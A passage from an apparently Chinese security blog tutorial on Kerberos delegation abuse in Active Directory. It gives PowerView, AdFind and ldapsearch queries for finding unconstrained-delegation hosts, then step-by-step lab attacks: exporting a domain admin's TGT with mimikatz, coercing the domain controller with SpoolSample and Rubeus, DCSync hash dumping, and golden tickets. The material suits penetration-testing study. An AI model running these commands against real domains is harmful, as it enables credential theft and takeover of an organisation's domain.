<p>默认域控是配置了非约束性委派的</p>
<h4 id="powerview"><a href="#powerview" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:powerview" class="headings">PowerView</a></h4>
<p>PowerView 有几个不同的版本，这里用的是 PowerShellEmpire 下的，脚本地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1" target="_blank" rel="noopener">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 导入 PowerView 脚本</span>
</span></span><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">powerview</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询域内非约束性委派的计算机</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetComputer</span> <span class="n">-Unconstrained</span> <span class="n">-Domain</span> <span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询域内非约束性委派的服务账号</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetUser</span> <span class="n">-Unconstrained</span> <span class="n">-Domain</span> <span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
</span></span></code></pre></div><h4 id="adfind"><a href="#adfind" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:adfind" class="headings">Adfind</a></h4>
<p>下载地址：<a href="https://oss.zjun.info/file/AdFind.exe" target="_blank" rel="noopener">https://oss.zjun.info/file/AdFind.exe</a></p>
<p>该工具不需要账号密码即可查询，其他支持 ldap 协议的工具也可以实现查询</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查询域内非约束性委派的计算机</span>
</span></span><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=zjun,DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">-dn</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 查询非约束性委派的服务账号</span>
</span></span><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=zjun,DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">-dn</span>
</span></span></code></pre></div><h4 id="ldapsearch"><a href="#ldapsearch" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:ldapsearch" class="headings">ldapsearch</a></h4>
<p>kali 内置，其他系统安装</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Ubuntu 用户安装</span>
</span></span><span class="line"><span class="cl">sudo apt install ldap-utils
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># mac 用户安装</span>
</span></span><span class="line"><span class="cl">brew install ldapvi
</span></span></code></pre></div><p>该工具需要域内任意用户的账号密码，可在域外查询。其他支持 ldap 协议的工具也可以实现查询。</p>
<p>查询域内非约束委派的计算机</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -LLL -x -H ldap://172.16.86.136:389 -D <span class="s2">&#34;test@zjun.com&#34;</span> -w <span class="s2">&#34;P@ssw0rd&#34;</span>   -b <span class="nv">dc</span><span class="o">=</span>zjun,dc<span class="o">=</span>com  <span class="s2">&#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> -dn
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202141506468.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214150609212"></p>
<p>查询非约束性委派的服务账号</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -LLL -x -H ldap://172.16.86.136:389 -D <span class="s2">&#34;test@zjun.com&#34;</span> -w <span class="s2">&#34;P@ssw0rd&#34;</span>   -b <span class="nv">dc</span><span class="o">=</span>zjun,dc<span class="o">=</span>com  <span class="s2">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> cn distinguishedName
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202141506972.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220214150643671"></p>
<h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:非约束性委派攻击" class="headings">非约束性委派攻击</a></h3>
<p>用户 user 去访问服务 service，如果服务 service 的服务账户开启了非约束性委派，那么当用户 user 访问服务 service 的时候会将用户 user 的 TGT 发送给服务 service 并保存在内存中以备下次重用，所以服务 service 能够利用用户 user 的身份去访问用户 user 能够访问的任意服务。</p>
<p>两种攻击方式，一种是诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务，二是结合打印机漏洞让域管用户强制回连以缓存 TGT。</p>
<h4 id="模拟域管访问非约束性委派主机"><a href="#模拟域管访问非约束性委派主机" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:模拟域管访问非约束性委派主机" class="headings">模拟域管访问非约束性委派主机</a></h4>
<p>模拟域管用户 <code>zjun/Administrator</code>（只要是域管用户，不一定在域控）远程访问非约束性委派主机机 <code>Win-2008</code> ， <code>Win-2008</code> 已获得本地管理员权限。常见可利用钓鱼的连接方式可以是 MSSQL 或 IIS，这里演示域管用户 <code>zjun/Administrator</code> 直接 IPC 连接 <code>Win-2008</code> 。</p>
<p><code>Win-2008</code> 无法访问域控 <code>P-DC.zjun.com</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="nb">P-DC</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202151718682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220215171830309"></p>
<p>域管用户 <code>zjun/Administrator</code> IPC 连接 <code>Win-2008</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">Win</span><span class="p">-</span><span class="n">2008</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">zjun</span><span class="p">\</span><span class="n">administrator</span> <span class="n">P</span><span class="nv">@ssw0rd2019</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202151739592.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220215173931098"></p>
<p>这适合 <code>Win-2008</code> 机器就已经有了域管 <code>zjun/Administrator</code> 的 TGT 票据，可以用 mimikatz 导出</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># mimikatz</span>
</span></span><span class="line"><span class="cl"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl"><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202151742777.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220215174214324"></p>
<p>然后通过 Pass The Ticket（PTT）将 TGT 注入到当前会话中</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># mimikatz</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">7af73</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">60a10000-Administrator</span><span class="nv">@krbtgt</span><span class="n">-ZJUN</span><span class="p">.</span><span class="n">COM</span><span class="p">.</span><span class="n">kirbi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># DOS</span>
</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="nb">P-DC</span><span class="p">.</span><span class="n">zjun</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202151747499.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220215174728134"></p>
<p><img src="https://oss.zjun.info/zjun.info/202202151749581.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220215174903649"></p>
<h4 id="非约束性委派-spooler-打印机服务漏洞"><a href="#非约束性委派-spooler-打印机服务漏洞" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:非约束性委派-spooler-打印机服务漏洞" class="headings">非约束性委派 +Spooler 打印机服务漏洞</a></h4>
<p>利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code> 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
<p>非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 <code>P-DC</code> 强制访问已控的具有本地管理员权限的非约束性委派机器 <code>Win-2008</code> ，从而拿到域管理员的 TGT，进而接管域控。</p>
<p>首先利用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>在 <code>Win-2008</code> 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 <code>P-DC</code> 的登录信息</p>
<p>已编译的 Rubeus 下载：<a href="https://oss.zjun.info/file/Rubeus.exe" target="_blank" rel="noopener">https://oss.zjun.info/file/Rubeus.exe</a></p>
<p>版本：<a href="https://github.com/GhostPack/Rubeus/releases/tag/1.6.4" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus/releases/tag/1.6.4</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="err">:</span><span class="n">1</span> <span class="p">/</span><span class="n">filteruser</span><span class="err">:</span><span class="nb">P-DC</span><span class="p">$</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202161317998.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216131653076"></p>
<p>再利用<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>
<p>已编译的 SpoolSample 下载：<a href="https://oss.zjun.info/file/SpoolSample.exe" target="_blank" rel="noopener">https://oss.zjun.info/file/SpoolSample.exe</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="nb">P-DC</span> <span class="n">Win</span><span class="p">-</span><span class="n">2008</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202161332753.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216133229470"></p>
<p>同时 Rubeus 也获取到了来自域控 <code>P-DC</code> 的 TGT 票据</p>
<p><img src="https://oss.zjun.info/zjun.info/202202161335453.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216133347094"></p>
<p>Rubeus 导入获取到的 TGT 票据</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">Base64EncodedTicket</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202161351112.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216135155599"></p>
<p>这时候管理员权限运行 mimikatz 就可以获取域内所有用户的 NTLM hash，内存中也有了域管的 TGT 也可以直接 PTT。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;log&#34;</span> <span class="s2">&#34;lsadump::dcsync /all /csv&#34;</span> <span class="s2">&#34;exit&#34;</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202202161359682.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216135932598"></p>
<p>接下来解密 NTLM hash 后可以直接登录域控，解不开也可以利用 krbtgt 的 NTLM hash 用于做黄金票据权限维持，可以参考：<a href="https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8" target="_blank" rel="noopener">https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8</a></p>
<p>有了黄金票据也同样可以访问域控了，使用 WinRM 服务来远程连接域控命令执行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nb">P-DC</span>
</span></span></code></pre></div><h2 id="约束性委派"><a href="#约束性委派" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:约束性委派" class="headings">约束性委派</a></h2>
<p>由于非约束性委派的不安全性，微软在 Windows Server 2003 中引入了约束委派。区别在于不会直接把 TGT 给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。同时为了在 Kerberos 协议层面对约束性委派的支持， 微软扩展了两个子协议：</p>
<ul>
<li>S4U2Self <code>Service for User to Self</code></li>
<li>S4U2Proxy <code>Service for User to Proxy</code></li>
</ul>
<p><code>S4U2Self</code> 可以代表自身请求针对其自身的 Kerberos 服务票据 <code>ST</code> ， <code>S4U2Proxy</code> 可以用上一步获得的可转发 ST 服务票据以用户的名义请求针对其他指定服务的 ST 服务票据。</p>
<p>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的 <code>msDS- AllowedToDelegateTo</code> 属性会指定对哪个 SPN 进行委派。约束性委派的设置需要 SeEnableDelegationPrivilege 权限，该特权通常只有域管理员才有。</p>
<h3 id="在域控上配置约束性委派"><a href="#在域控上配置约束性委派" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:在域控上配置约束性委派" class="headings">在域控上配置约束性委派</a></h3>
<p>约束性委派有两种，然后添加可以由此账户提供委派凭证的服务即可：</p>
<ul>
<li>
<p>仅使用 Kerberos(K)</p>
</li>
<li>
<p>使用任何身份验证协议 (N)</p>
<p>下面设置了服务用户 <code>test</code> 的约束性委派，协议为域控 <code>P-DC</code> 的 <code>cifs</code> 协议</p>
</li>
</ul>
<p><img src="https://oss.zjun.info/zjun.info/202202162030918.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216203007438"></p>
